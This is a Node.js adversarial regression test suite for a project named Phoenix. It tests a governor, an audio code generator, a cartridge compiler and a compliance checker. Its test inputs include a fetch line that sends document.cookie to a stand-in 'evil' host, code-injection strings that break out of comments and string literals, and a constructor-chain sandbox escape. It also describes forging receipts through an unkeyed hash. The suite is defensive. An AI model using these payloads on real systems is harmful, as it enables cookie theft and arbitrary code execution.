// @ts-nocheck
/* cSpell:words unkeyed exfil sanitised */
/**
 * ============================================================================
 * PHOENIX ADVERSARIAL REGRESSION SUITE
 * Document Identifier: TEST-PHOENIX-ADVERSARIAL-001
 * ============================================================================
 * Zero-dependency Node.js suite. Every test asserts the SECURE / CORRECT
 * behavior. Tests are tagged by what they prove:
 *
 *   CONTROL  Behavior that holds today. A failure here is a REGRESSION.
 *   DEFECT   A reproduced bug. Fails today; passes once fixed.
 *   POLICY   Fails today, but the expectation derives from the project's own
 *            stated rules (cited in each test) rather than from a bug in the
 *            code as written. Delete the test if you change the policy.
 *
 * KNOWN_OPEN lists the DEFECT/POLICY ids that are expected to fail today.
 *   - fail, in KNOWN_OPEN      -> OPEN        (expected, exit 0)
 *   - pass, in KNOWN_OPEN      -> FIXED       (prune the id from KNOWN_OPEN)
 *   - fail, not in KNOWN_OPEN  -> NEW FAILURE (exit 1)
 *   - CONTROL fails            -> REGRESSION  (exit 1)
 *   --strict                   -> any failure exits 1 (use once all are fixed)
 *
 * Run:
 *   node test_adversarial.js [--strict] [--only=GOV-D1]
 * Module lookup: $PHOENIX_DIR, then this directory, its parent, and ./runtime.
 *
 * Every attack here was executed against the uploaded sources before it was
 * written down. Nothing in this file is a hypothetical.
 * ============================================================================
 */
'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const STRICT = process.argv.includes('--strict');
const ONLY = (process.argv.find((a) => a.startsWith('--only=')) || '').slice(7) || null;

/* ── Module resolution ─────────────────────────────────────────────────── */
function locate(name) {
	const dirs = [
		process.env.PHOENIX_DIR,
		path.join(__dirname, '..', '..', 'phoenix'),
		path.join(__dirname, '..', '..', 'phoenix', 'runtime'),
		__dirname,
		path.join(__dirname, '..'),
		path.join(__dirname, 'runtime'),
		path.join(__dirname, '..', 'runtime')
	].filter(Boolean);
	for (const d of dirs) {
		const p = path.join(d, name);
		if (fs.existsSync(p)) return p;
	}
	throw new Error(`cannot locate ${name} (set PHOENIX_DIR)`);
}

const Phoenix = require(locate('phoenix_sovereign_engine.js'));
const AudioSynth = require(locate('phoenix_audio_synth.js'));
const Synarche = require(locate('synarche_parser.js')).SynarcheCompiler;
const VLT = require(locate('vlt_compliance_engine.js'));

/* ── Governor harness (public API only: no monkeypatching of the gates) ── */
class NodeStorage extends Phoenix.SovereignStorage {
	constructor() {
		super('adv-ns');
		this._journal = [];
	}
	async initialize() { return this; }
	async appendJournalEntry(r) { this._journal.push(r); }
	async readJournal() { return this._journal.slice(); }
	async write() { return true; }
	async read() { return null; }
	get hasOPFS() { return false; }
	get hasProject() { return false; }
}

const TARGET = 'combat/SEC-10';
const SRC0 = 'function calculateDamage(){ return 10; }';

/** Reads a registered source out of whatever shape the engine hands to tests. */
function srcText(sources, file) {
	const v = sources instanceof Map ? sources.get(file) : sources?.[ file ];
	return typeof v === 'string' ? v : String((v?.content) ?? '');
}

function makeGovernor() {
	const spec = new Phoenix.SpecificationRegistry();
	spec.registerTarget(TARGET, {
		tenant: 'Combat',
		path: 'combat.js',
		allowedOperations: [ 'MODIFY' ],
		capabilities: [],
		dependencies: []
	});
	// State-only invariant (same shape as the shipped one).
	spec.registerInvariant('damage.nonnegative', (s) => (s.damage >= 0 ? true : 'damage negative'));
	// Source-aware tests: the engine passes (state, context, sources).
	spec.registerTest('src.no-neg9999', (_s, _c, sources) =>
		srcText(sources, 'combat.js').includes('-9999') ? 'source contains -9999' : true);
	return new Phoenix.Governor({ spec, storage: new NodeStorage(), initialState: { damage: 10 } });
}

let _n = 0;
const change = (content, search = 'return 10;') =>
	[ { type: 'replace_text', path: 'combat.js', search, content } ];

function proposal(over = {}) {
	_n += 1;
	return {
		schemaVersion: 'PGE-DSL-1',
		proposalId: `adv-${_n}`,
		target: TARGET,
		operation: 'MODIFY',
		intent: 'adversarial test change',
		requiredCapabilities: [],
		expectedInvariants: [ 'damage.nonnegative' ],
		testsRequested: [],
		changes: change('return 10;'),
		explanation: 'adversarial',
		...over
	};
}

/** Submits one proposal to a fresh governor. Grants are made via the real API. */
async function submit(over, { grant = 'Combat.MODIFY' } = {}) {
	const gov = makeGovernor();
	await gov.initialize();
	gov.registerSource('combat.js', SRC0);
	if (grant) gov.capabilities.grant('adv-agent', grant, TARGET);
	const receipt = await gov.submit(proposal(over), 'adv-agent');
	return { gov, receipt, src: gov.getSource('combat.js') };
}

function assertNotAccepted({ receipt, src }, why) {
	assert.notEqual(receipt.status, Phoenix.STATUS.PASS, `${why}: governor returned PASS/${receipt.gate}`);
	assert.equal(src, SRC0, `${why}: source was mutated`);
}

const hashAsync = async (x) => Phoenix.hash(x);

/* ── Synarche helpers ──────────────────────────────────────────────────── */
const HDR = '@cartridge Adv\n@version 1.0.0\n@tier 2\n';

function compileTry(src, opts) {
	try {
		return { result: Synarche.compile(src, opts) };
	} catch (e) {
		return { threw: String(e?.message) };
	}
}
const admitted = (o) => !o.threw && o.result?.receipt?.status === 'ADMITTED';

/** Expects the compiler to refuse (throw with `code`, or return a non-ADMITTED receipt). */
function assertDenied(o, code, why) {
	if (o.threw) {
		assert.match(o.threw, new RegExp(code), `${why}: threw, but not ${code}: ${o.threw.slice(0, 120)}`);
		return;
	}
	assert.ok(!admitted(o), `${why}: ADMITTED`);
}

const CANARY = '__ADV_CANARY__';
/** Loads emitted cartridge code in the HOST realm and invokes one lifecycle method. */
function runCartridge(code, method) {
	const m = { exports: {} };
	new Function('module', 'exports', code)(m, m.exports); // NOSONAR: Test harness executes compiled cartridge in host realm to verify containment
	m.exports[ method ]({});
}

/* ── Audio codegen helper ──────────────────────────────────────────────── */
/** Executes generated code in a fresh vm realm; returns the realm's global. */
function execGenerated(code) {
	const ctx = vm.createContext({ EmberlightEventBus: { subscribe() { } } });
	try {
		new vm.Script(code).runInContext(ctx); // NOSONAR: Test harness evaluates generated audio script in isolated vm realm
	} catch (_) {
		// A syntax/runtime error means the injected code did not (fully) run.
		// The security property under test is only "attacker code never executes".
	}
	return ctx;
}

/* ============================================================================
 * TESTS
 * ========================================================================== */
const tests = [];
const T = (id, cat, title, fn) => tests.push({ id, cat, title, fn });

/* ── Governor: controls (good behavior that must not regress) ─────────── */
T('GOV-C1', 'CONTROL', 'no grant -> CAPABILITY_GATE rejects (default-deny)', async () => {
	const o = await submit({}, { grant: null });
	assert.equal(o.receipt.status, Phoenix.STATUS.REJECTED);
	assert.equal(o.receipt.gate, Phoenix.GATES.CAPABILITY);
	assert.equal(o.src, SRC0);
});

T('GOV-C2', 'CONTROL', 'proposal cannot remove the target-derived base capability', async () => {
	const o = await submit({ requiredCapabilities: [] }, { grant: 'Other.MODIFY' });
	assert.equal(o.receipt.gate, Phoenix.GATES.CAPABILITY);
	assertNotAccepted(o, 'wrong capability granted');
});

T('GOV-C3', 'CONTROL', 'source-aware test sees candidate source, rejects, rolls back', async () => {
	const o = await submit({ testsRequested: [ 'src.no-neg9999' ], changes: change('return -9999;') });
	assert.equal(o.receipt.gate, Phoenix.GATES.BEHAVIOR);
	assertNotAccepted(o, 'source-aware test');
});

T('GOV-C4', 'CONTROL', 'unregistered invariant name is rejected at BEHAVIOR_GATE', async () => {
	const o = await submit({ expectedInvariants: [ 'nope.nonexistent' ] });
	assert.equal(o.receipt.gate, Phoenix.GATES.BEHAVIOR);
	assertNotAccepted(o, 'unknown invariant');
});

T('GOV-C5', 'CONTROL', 'placeholder token "// ..." is rejected at STRUCTURAL_GATE', async () => {
	const o = await submit({ changes: change('// ...\nreturn 10;') });
	assert.equal(o.receipt.gate, Phoenix.GATES.STRUCTURAL);
	assertNotAccepted(o, 'placeholder');
});

/* ── Governor: defects ─────────────────────────────────────────────────── */
T('GOV-D1', 'DEFECT', 'a proposal listing zero invariants and zero tests must not PASS', async () => {
	// The behavior gate only runs checks the proposal itself names, so an
	// empty list is a vacuous PASS. Required checks should come from the target.
	const o = await submit({ expectedInvariants: [], testsRequested: [], changes: change('return -9999;') });
	assertNotAccepted(o, 'vacuous behavior gate');
});

T('GOV-D2', 'DEFECT', 'syntactically invalid post-apply JS must not PASS', async () => {
	// Uses a listed (state-only) invariant so D1 cannot mask this result.
	const o = await submit({ changes: change('return 10; }}} ((') });
	assertNotAccepted(o, 'invalid JS');
});

T('GOV-D3', 'DEFECT', 'receipt integrity must not be recomputable from public exports', async () => {
	// Shipped: receipt.integrity = hash(stable({...receipt, integrity: ""})) with an
	// unkeyed public hash, so anyone can flip `status` and recompute a "valid"
	// integrity. There is no receipt verifier to catch it (ReceiptLedger only has
	// append/list/latest/size). The test tries every plausible convention for the
	// excluded field so that it cannot false-pass on a convention mismatch.
	const { receipt } = await submit({}, { grant: null });
	const { integrity, ...rest } = receipt;
	const conventions = [ { ...rest, integrity: '' }, { ...rest }, { ...rest, integrity: null } ];
	const recomputedList = await Promise.all(
		conventions.map((candidate) => hashAsync(Phoenix.stable(candidate))),
	);
	for (const recomputed of recomputedList) {
		assert.notEqual(recomputed, integrity,
			`integrity ${integrity} is reproducible from public primitives (forgeable)`);
	}
});

T('GOV-D4', 'DEFECT', 'known FNV-1a-32 collision pair must not collide under hash()', async () => {
	// 'k32728' and 'k261234' both hash to 92c402be under the shipped hash().
	const a = await hashAsync('k32728');
	const b = await hashAsync('k261234');
	assert.notEqual(a, b, `hash collision: ${a}`);
});

T('GOV-D5', 'DEFECT', 'receipt digest must be at least 256 bits (64 hex chars)', async () => {
	const { receipt } = await submit({}, { grant: null });
	assert.ok(String(receipt.integrity).length >= 64,
		`integrity is ${String(receipt.integrity).length * 4} bits (${receipt.integrity})`);
});

/* ── Governor: policy (basis: the compiler's own FARADAY_RESTRICTED_GLOBALS) */
const POLICY_BASIS = "compiler's Faraday list denies eval/Function/fetch/document/window";
T('GOV-P1', 'POLICY', `eval() in a governed change must not PASS (${POLICY_BASIS})`, async () => {
	assertNotAccepted(await submit({ changes: change('return eval("1");') }), 'eval');
});
T('GOV-P2', 'POLICY', 'fetch()+document.cookie exfiltration must not PASS', async () => {
	assertNotAccepted(await submit({ changes: change('fetch("//evil/"+document.cookie); return 10;') }), 'exfil');
});
T('GOV-P3', 'POLICY', 'new Function() in a governed change must not PASS', async () => {
	assertNotAccepted(await submit({ changes: change('return new Function("return 1")();') }), 'Function ctor');
});
T('GOV-P4', 'POLICY', 'globalThis access in a governed change must not PASS (basis: SYN-D2/D3 escapes)', async () => {
	assertNotAccepted(await submit({ changes: change('globalThis.x = 1; return 10;') }), 'globalThis');
});

/* ── Audio codegen: injection ──────────────────────────────────────────── */
T('AUD-C1', 'CONTROL', 'generated function name is sanitised and benign output parses', async () => {
	const code = AudioSynth.generateSFXCode({ name: 'Laser Blast', wave: 'sine' }, 'standalone');
	assert.match(code, /function playLaserBlastSFX\(/);
	const script = new vm.Script(code); // NOSONAR: Validate JavaScript syntax of generated function
	assert.ok(script);
});

T('AUD-D1', 'DEFECT', 'newline in `name` must not break out of the // comment (eventbus)', async () => {
	const code = AudioSynth.generateSFXCode({ name: `x\nglobalThis.${CANARY}=1;\n//`, wave: 'sine' }, 'eventbus');
	assert.equal(execGenerated(code)[ CANARY ], undefined, 'attacker statement executed');
});

T('AUD-D2', 'DEFECT', 'eventName must not break out of its string literal (eventbus)', async () => {
	const code = AudioSynth.generateSFXCode({ name: 'ok', wave: 'sine' }, 'eventbus', `E'); globalThis.${CANARY}=1; ('`);
	assert.equal(execGenerated(code)[ CANARY ], undefined, 'attacker statement executed');
});

T('AUD-D3', 'DEFECT', '`*/` in `name` must not break out of the JSDoc block (standalone)', async () => {
	const code = AudioSynth.generateSFXCode({ name: `x */ globalThis.${CANARY}=1; /*`, wave: 'sine' }, 'standalone');
	assert.equal(execGenerated(code)[ CANARY ], undefined, 'attacker statement executed');
});

/* ── Synarche compiler: controls ───────────────────────────────────────── */
T('SYN-C1', 'CONTROL', 'Faraday denylist names are rejected (ERR_0x16)', async () => {
	for (const g of [ 'window', 'document', 'localStorage', 'sessionStorage', 'fetch', 'XMLHttpRequest', 'eval', 'Function' ]) {
		assertDenied(compileTry(`${HDR}on boot() { let w = ${g}; }`), 'ERR_0x16', g);
	}
});

T('SYN-C2', 'CONTROL', 'heap allocation inside update() is rejected (ERR_0x17)', async () => {
	assertDenied(compileTry(`${HDR}on update(dt) { let o = new Object(); }`), 'ERR_0x17', 'new in update');
});

T('SYN-C3', 'CONTROL', 'canvas use without CAP_RENDER_CANVAS2D is rejected (ERR_0x15)', async () => {
	assertDenied(compileTry(`${HDR}on render(a) { ctx.fillRect(0,0,1,1); }`), 'ERR_0x15', 'ctx w/o capability');
});

T('SYN-C4', 'CONTROL', 'type mismatches are rejected (ERR_0x1A)', async () => {
	for (const expr of [ '1 * "s"', 'true + 1' ]) {
		const o = compileTry(`${HDR}on update(dt) { let y = ${expr}; }`);
		assert.ok(!admitted(o), `${expr}: ADMITTED`);
		const text = o.threw || (o.result.errors || []).join(' ');
		assert.match(text, /ERR_0x1A/, `${expr}: wrong rejection reason`);
	}
});

T('SYN-C5', 'CONTROL', 'oversized PERSIST memory layout is rejected (ERR_0x13)', async () => {
	assertDenied(compileTry(`${HDR}memory PERSIST_001 { big: u8[99999999]; }`), 'ERR_0x13', 'memory overflow');
});

T('SYN-C6', 'CONTROL', 'orphaned emit / listen topics are rejected (ERR_0x0D)', async () => {
	assertDenied(compileTry(`${HDR}listen Ghost(p) { }`), 'ERR_0x0D', 'orphan listen');
	assertDenied(compileTry(`${HDR}emit Ghost(1);`), 'ERR_0x0D', 'orphan emit');
	assert.ok(admitted(compileTry(`${HDR}listen Ping(p) { }\nemit Ping(1);`)), 'matched pair must be ADMITTED');
});

/* ── Synarche compiler: defects ────────────────────────────────────────── */
T('SYN-D1', 'DEFECT', 'globalThis must not be ADMITTED inside a handler', async () => {
	const o = compileTry(`${HDR}on boot() { let g = globalThis; g.${CANARY} = 1; }`);
	assert.ok(!admitted(o), 'ADMITTED: denylist omits globalThis');
});

T('SYN-D2', 'DEFECT', 'an admitted cartridge must not mutate the host global (globalThis)', async () => {
	const o = compileTry(`${HDR}on boot() { let g = globalThis; g.${CANARY} = 1; }`);
	if (!admitted(o)) return; // refused at compile time = contained
	delete globalThis[ CANARY ];
	try {
		runCartridge(o.result.code, 'boot');
		assert.equal(globalThis[ CANARY ], undefined, 'cartridge wrote to the host global');
	} finally {
		delete globalThis[ CANARY ];
	}
});

T('SYN-D3', 'DEFECT', 'an admitted cartridge must not escape via .constructor.constructor', async () => {
	const body = `let s = "x"; let f = s.constructor.constructor; let h = f("return globalThis"); let g = h(); g.${CANARY} = 1;`;
	const o = compileTry(`${HDR}on boot() { ${body} }`);
	if (!admitted(o)) return;
	delete globalThis[ CANARY ];
	try {
		runCartridge(o.result.code, 'boot');
		assert.equal(globalThis[ CANARY ], undefined, 'constructor-chain reached the host global');
	} finally {
		delete globalThis[ CANARY ];
	}
});

T('SYN-D4', 'DEFECT', 'SLOPPY mode must not emit code or report ok for a REJECTED receipt', async () => {
	const o = compileTry('this is not a cartridge ;;; {{{', { mode: 'SLOPPY' });
	assert.ok(o.result, 'SLOPPY compile threw');
	const r = o.result;
	assert.equal(r.receipt?.status, 'REJECTED', 'precondition: garbage must be REJECTED');
	assert.ok(!r.ok, 'ok === true despite REJECTED receipt');
	assert.ok(!r.code, `emitted ${r.code?.length} chars of code from a REJECTED program`);
});

T('SYN-P1', 'POLICY', 'unknown capability names must not be ADMITTED (basis: ERR_0x15 UNMAPPED_CAPABILITY)', async () => {
	assert.ok(!admitted(compileTry(`${HDR}capabilities { rm_rf_root }\non update(dt) { }`)), 'ADMITTED');
});

T('SYN-P2', 'POLICY', 'undeclared identifiers must not be ADMITTED (basis: HM type-inference claim)', async () => {
	assert.ok(!admitted(compileTry(`${HDR}on update(dt) { let y = nope + 1; }`)), 'ADMITTED');
});

/* ── VLT compliance engine ─────────────────────────────────────────────── */
const ORPHAN_DSL = `${HDR}listen Ghost(p) { }`;

/** Runs fn with global SynarcheCompiler set (or removed), restoring afterwards. */
function withGlobalCompiler(value, fn) {
	const had = Object.hasOwn(globalThis, 'SynarcheCompiler');
	const prev = globalThis.SynarcheCompiler;
	try {
		if (value) globalThis.SynarcheCompiler = value;
		else delete globalThis.SynarcheCompiler;
		return fn();
	} finally {
		if (had) globalThis.SynarcheCompiler = prev;
		else delete globalThis.SynarcheCompiler;
	}
}

T('VLT-C1', 'CONTROL', 'with the compiler loaded, an orphaned listen is reported', async () => {
	const rep = withGlobalCompiler(Synarche, () => VLT.verifyBusLinkIntegrity(ORPHAN_DSL));
	assert.equal(rep.ok, false);
	assert.ok(rep.orphanedListens.includes('Ghost'));
});

T('VLT-C2', 'CONTROL', 'placeholder tokens are reported as TOKEN violations', async () => {
	const rep = VLT.validateCompliance('// ...\nconst a = 1;\n');
	assert.ok(rep.violations.some((v) => v.type === 'TOKEN'), 'no TOKEN violation');
});

T('VLT-D1', 'DEFECT', 'with the compiler absent, the documented regex fallback must still flag orphans', async () => {
	// The docstring promises "falls back to a lightweight regex scan"; the code
	// returns { ok: true } instead (fail-open).
	const rep = withGlobalCompiler(null, () => VLT.verifyBusLinkIntegrity(ORPHAN_DSL));
	assert.equal(rep.ok, false, 'fail-open: orphan reported as ok:true');
});

T('VLT-D2', 'DEFECT', 'DOM socket / Atomics.wait audits must not be bypassed by bracket access or aliasing', async () => {
	const bypasses = [
		'const q = document["querySelector"]("#x");',
		'const d = document; d.getElementById("x");',
		'function boot() { Atomics["wait"](a, 0, 0); }'
	];
	const missed = bypasses.filter((src) => {
		const rep = VLT.validateCompliance(src);
		return !rep.violations.some((v) => v.type === 'SOCKET_BREACH' || v.type === 'ATOMIC_WAIT');
	});
	assert.deepEqual(missed, [], `audit missed: ${missed.join(' | ')}`);
});

/* ── Known-open registry ───────────────────────────────────────────────── */
const KNOWN_OPEN = new Set([
	'GOV-D1', 'GOV-D2', 'GOV-D3', 'GOV-D4', 'GOV-D5',
	'GOV-P1', 'GOV-P2', 'GOV-P3', 'GOV-P4',
	'AUD-D1', 'AUD-D2', 'AUD-D3',
	'SYN-D1', 'SYN-D2', 'SYN-D3', 'SYN-D4', 'SYN-P1', 'SYN-P2',
	'VLT-D1', 'VLT-D2'
]);

/* ── Runner ────────────────────────────────────────────────────────────── */
function recordTestResult(t, err, tally) {
	const tag = `${t.id} [${t.cat}]`;
	if (!err) {
		if (KNOWN_OPEN.has(t.id)) {
			tally.fixed.push(t.id);
			console.log(`  ✓ ${tag} ${t.title}   <- FIXED: remove ${t.id} from KNOWN_OPEN`);
		} else {
			tally.ok += 1;
			console.log(`  ✓ ${tag} ${t.title}`);
		}
		return;
	}
	const msg = String(err?.message).split('\n')[ 0 ].slice(0, 160);
	if (t.cat === 'CONTROL') {
		tally.regression.push(t.id);
		console.log(`  ✗ ${tag} ${t.title}\n      REGRESSION: ${msg}`);
	} else if (KNOWN_OPEN.has(t.id)) {
		tally.open += 1;
		console.log(`  ✗ ${tag} ${t.title}\n      OPEN: ${msg}`);
	} else {
		tally.fresh.push(t.id);
		console.log(`  ✗ ${tag} ${t.title}\n      NEW FAILURE: ${msg}`);
	}
}

async function executeSingleTest(t, tally) {
	let err = null;
	try {
		await t.fn();
	} catch (e) {
		err = e;
	}
	recordTestResult(t, err, tally);
}

function printSummary(tally) {
	console.log('\n' + '─'.repeat(70));
	console.log(`secure/holding: ${tally.ok}   open (expected): ${tally.open}   ` +
		`fixed: ${tally.fixed.length}   regressions: ${tally.regression.length}   new failures: ${tally.fresh.length}`);
	if (tally.regression.length) console.log(`REGRESSIONS: ${tally.regression.join(', ')}`);
	if (tally.fresh.length) console.log(`NEW FAILURES: ${tally.fresh.join(', ')}`);
	if (tally.fixed.length) console.log(`FIXED (prune from KNOWN_OPEN): ${tally.fixed.join(', ')}`);
}

async function main() {
	try {
		const selected = ONLY ? tests.filter((t) => t.id === ONLY) : tests;
		if (selected.length === 0) {
			console.error(`no test matches --only=${ONLY}`);
			process.exit(2);
		}
		console.log('\nPHOENIX ADVERSARIAL REGRESSION SUITE (TEST-PHOENIX-ADVERSARIAL-001)\n');

		const tally = { ok: 0, open: 0, fixed: [], regression: [], fresh: [] };
		await selected.reduce(async (chain, t) => {
			await chain;
			await executeSingleTest(t, tally);
		}, Promise.resolve());

		printSummary(tally);

		const bad = tally.regression.length + tally.fresh.length > 0 || (STRICT && tally.open > 0);
		process.exit(bad ? 1 : 0);
	} catch (e) {
		console.error(e);
		process.exit(2);
	}
}

main(); // NOSONAR: CommonJS entrypoint execution
